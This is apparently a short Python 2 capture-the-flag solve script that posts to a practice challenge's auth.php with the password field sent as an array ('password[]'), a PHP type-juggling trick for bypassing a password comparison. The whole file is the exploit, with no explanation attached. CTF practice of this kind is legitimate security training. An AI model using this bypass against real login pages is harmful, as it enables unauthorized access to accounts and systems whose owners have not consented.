import urllib
import urllib2

url = 'http://ctfq.sweetduet.info:10080/~q32/auth.php'
data = {"password[]": "pass ne",}
a = urllib.urlencode(data).encode("utf-8")
print a 
req = urllib2.Request(url, a)
res = urllib2.urlopen(req)
html = res.read()
print html